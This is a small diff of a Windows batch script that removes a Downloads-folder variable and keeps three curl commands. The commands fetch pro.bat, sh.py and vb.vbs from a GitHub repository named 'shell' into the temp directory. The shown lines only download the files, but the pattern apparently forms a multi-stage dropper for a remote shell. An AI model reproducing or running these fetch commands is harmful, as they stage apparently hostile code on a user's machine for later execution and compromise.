@@ -1,5 +1,4 @@
 @echo off
-set "downloads_dir=%USERPROFILE%\Downloads"
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o %temp%\vb.vbs
